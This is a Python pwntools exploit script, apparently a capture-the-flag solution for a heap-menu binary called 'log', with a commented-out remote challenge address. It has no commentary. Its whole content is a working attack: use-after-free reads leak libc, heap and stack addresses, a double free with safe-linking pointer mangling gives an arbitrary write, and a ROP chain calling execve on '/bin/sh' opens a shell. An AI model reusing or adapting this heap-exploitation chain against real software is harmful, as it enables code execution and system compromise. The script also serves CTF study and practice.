#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template log
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('log')
ld = ELF('./ld-2.35.so')
libc = ELF('./libc.so.6')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([ld.path,exe.path] + argv, gdbscript=gdbscript, *a, **kw,env={"LD_PRELOAD":libc.path})
    else:
        return process([exe.path] + argv, env = {"LD_PRELOAD":libc.path})

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
def add_req(size,payload):
    io.sendafter(b'> ',p32(0))
    io.send(p32(size))
    io.send(payload)
    return

def remove(index):
    io.sendafter(b'> ',p32(2))
    io.send(p32(index))
    return

def show(index):
    io.sendafter(b'> ',p32(1))
    io.send(p32(index))
    return

offset = 0x219CE0

fun_chunk = 0xfd0

leak_offset = 0x21AF00

argv_off = 0x21AA20

ret_off = 0x130

pop_rdi =0x000000000002a3e5

pop_rsi = 0x000000000002be51

pop_rdx_pop_rbx = 0x0000000000090529

sh_off = 0x1d8698 

execve = 0x00eb0f0

io = start()

#io = remote('log.challs.teamitaly.eu' ,29006)

add_req(0x510,b'A'*0x510) #create chunk in unsorted bin to leak libc address

chunk1 = 0x5e0

chunk2 = 0x1070

remove(0)

show(0)

chunk = io.recvuntil(b'\x7f')

chunk = chunk[8:]

print(chunk)

libc_leak = int.from_bytes(chunk,'little')

libc_base = libc_leak - offset

log.info('Libc base is {0}'.format(hex(libc_base)))

add_req(0x50,b'A'*0x50)

remove(1)

show(1)
 
chunk = io.recv()

chunk = chunk[0x8:-0x55]

print(chunk)

chunk = int.from_bytes(chunk,'little')

chunk = chunk<<12

heap_base = chunk

log.info('Heap base is: {0}'.format(hex(heap_base)))

io.send(p32(9999))

add_req(0x10,b'A'*0x10) #2

add_req(0x20,b'A'*0x20) #3

add_req(0x50,b'A'*0x50) #4

for i in range(8):
    add_req(0x10,b'A'*0x10) #5-12
for i in range(7):
    remove(11-i)

remove(12)

remove(2)#now 3 and 4 has 2 and 3 indexes

remove(12)

for i in range(7):
    add_req(0x10,b'A'*0x10) #19

argvx = (libc_base + argv_off-0x10)^(heap_base+chunk1)>>12

add_req(0x8,p64(argvx)) #20

add_req(0x8,b'A'*0x8) #21

add_req(0x8,b'A'*8)#22

add_req(0x40,b'A'*0x40) #23

add_req(0x8,b'A'*0x8) #24

remove(23)

show(23)

stack = io.recv()[0x18:-0x34]

stack = int.from_bytes(stack,'little')


log.info('stack_leak is: {0}'.format(hex(stack)))

io.send(p32(9999))

for i in range(8):
    add_req(0x50,b'A'*0x50) #25-32

for i in range(7):
    remove(25)

remove(32)

remove(3)

remove(32)
for i in range(7):
    add_req(0x50,b'A'*0x50)

stack_ret = (stack-ret_off-0x8)^((heap_base+chunk2)>>12)

add_req(0x50,p64(stack_ret)+b'A'*0x48)

add_req(0x50,b'A'*0x50) 

add_req(0x50,b'A'*0x50)

rop_chain =p64(0)+p64(libc_base+pop_rdi)+p64(libc_base+sh_off)+p64(libc_base+pop_rsi)+p64(0)+p64(libc_base+pop_rdx_pop_rbx)+p64(0)+p64(0)+p64(libc_base+execve)+p64(0)
add_req(0x50,rop_chain)

io.interactive()

